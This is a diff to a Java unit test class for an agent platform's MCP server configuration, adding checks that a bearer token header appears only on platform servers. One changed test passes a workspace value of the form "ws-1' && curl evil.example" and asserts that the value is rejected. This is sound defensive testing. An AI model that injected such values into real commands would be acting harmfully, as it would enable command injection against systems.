@@ -11,6 +11,7 @@ import eu.wohlben.qits.agents.McpEndpoints;
 import eu.wohlben.qits.agents.ScopedMcp;
 import eu.wohlben.qits.commands.InvalidCommandRequestException;
 import java.util.List;
+import java.util.Map;
 import java.util.Optional;
 import org.junit.jupiter.api.Test;
 
@@ -53,11 +54,17 @@ class WorkspaceMcpServersTest {
 
   private static final String PLATFORM_URL = "http://qits-platform-access-mcp-service:8080/mcp";
 
+  private static final String TOKEN = "tok-abc123";
+
   private final WorkspaceMcpServers servers =
-      new WorkspaceMcpServers(ENDPOINTS, REPO, WORKSPACE, Optional.of(PLATFORM_URL));
+      new WorkspaceMcpServers(ENDPOINTS, REPO, WORKSPACE, Optional.of(PLATFORM_URL), Optional.empty());
 
   private final WorkspaceMcpServers withoutPlatformUrl =
-      new WorkspaceMcpServers(ENDPOINTS, REPO, WORKSPACE, Optional.empty());
+      new WorkspaceMcpServers(ENDPOINTS, REPO, WORKSPACE, Optional.empty(), Optional.empty());
+
+  private final WorkspaceMcpServers withToken =
+      new WorkspaceMcpServers(
+          ENDPOINTS, REPO, WORKSPACE, Optional.of(PLATFORM_URL), Optional.of(TOKEN));
 
   @Test
   void theSeamIsImplementedRatherThanLeftOnTheLibrarysDefault() {
@@ -149,7 +156,11 @@ class WorkspaceMcpServersTest {
     // its own, so the grammar check is the boundary.
     WorkspaceMcpServers hostile =
         new WorkspaceMcpServers(
-            ENDPOINTS, REPO, "ws-1' && curl evil.example", Optional.of(PLATFORM_URL));
+            ENDPOINTS,
+            REPO,
+            "ws-1' && curl evil.example",
+            Optional.of(PLATFORM_URL),
+            Optional.empty());
 
     assertThrows(
         InvalidCommandRequestException.class,
@@ -241,5 +252,77 @@ class WorkspaceMcpServersTest {
           servers.serversFor(scope).stream().noneMatch(server -> server.key().equals("qits")),
           scope.toString());
     }
+  }
+
+  @Test
+  void withATokenTheThreePlatformServersCarryTheBearerHeaderAndActionsDoesNot() {
+    Map<String, String> expected = Map.of("Authorization", "Bearer " + TOKEN);
+
+    List<ScopedMcp> actionsScope = withToken.serversFor(AgentMcpScope.ACTIONS);
+    assertEquals(3, actionsScope.size());
+    assertEquals(Map.of(), actionsScope.get(0).headers()); // actions
+    assertEquals(expected, actionsScope.get(1).headers()); // repository
+    assertEquals(expected, actionsScope.get(2).headers()); // observability
+
+    List<ScopedMcp> repositoryScope = withToken.serversFor(AgentMcpScope.REPOSITORY);
+    assertEquals(expected, repositoryScope.get(0).headers());
+    assertEquals(expected, repositoryScope.get(1).headers());
+
+    List<ScopedMcp> projectScope = withToken.serversFor(AgentMcpScope.PROJECT);
+    assertEquals(expected, projectScope.get(0).headers());
+
+    assertEquals(
+        expected,
+        withToken
+            .serverFor("repository", AgentMcpScope.REPOSITORY, new AgentMcpNarrowing(false, false, false))
+            .orElseThrow()
+            .headers());
+    assertEquals(
+        expected,
+        withToken
+            .serverFor("observability", AgentMcpScope.REPOSITORY, new AgentMcpNarrowing(false, true, true))
+            .orElseThrow()
+            .headers());
+    assertEquals(
+        expected,
+        withToken
+            .serverFor("qits", AgentMcpScope.REPOSITORY, new AgentMcpNarrowing(false, false, false))
+            .orElseThrow()
+            .headers());
+
+    assertEquals(expected, withToken.platformHeaders());
+  }
+
+  @Test
+  void withoutATokenEveryServerIsByteIdenticalToTodays() {
+    // Blank-but-present (the un-filled "${QITS_TOKEN:}" default) and genuinely absent both answer
+    // empty — the exact same shape every server rendered before this header existed.
+    WorkspaceMcpServers blankToken =
+        new WorkspaceMcpServers(ENDPOINTS, REPO, WORKSPACE, Optional.of(PLATFORM_URL), Optional.of(""));
+
+    for (AgentMcpScope scope : AgentMcpScope.values()) {
+      for (ScopedMcp server : servers.serversFor(scope)) {
+        assertEquals(Map.of(), server.headers(), server.key());
+      }
+      for (ScopedMcp server : blankToken.serversFor(scope)) {
+        assertEquals(Map.of(), server.headers(), server.key());
+      }
+    }
+    assertEquals(Map.of(), servers.platformHeaders());
+    assertEquals(Map.of(), blankToken.platformHeaders());
+    assertEquals(Map.of(), withoutPlatformUrl.platformHeaders());
+
+    assertEquals(
+        Map.of(),
+        servers
+            .serverFor("repository", AgentMcpScope.REPOSITORY, new AgentMcpNarrowing(false, false, false))
+            .orElseThrow()
+            .headers());
+    assertEquals(
+        Map.of(),
+        servers
+            .serverFor("qits", AgentMcpScope.REPOSITORY, new AgentMcpNarrowing(false, false, false))
+            .orElseThrow()
+            .headers());
   }
 }
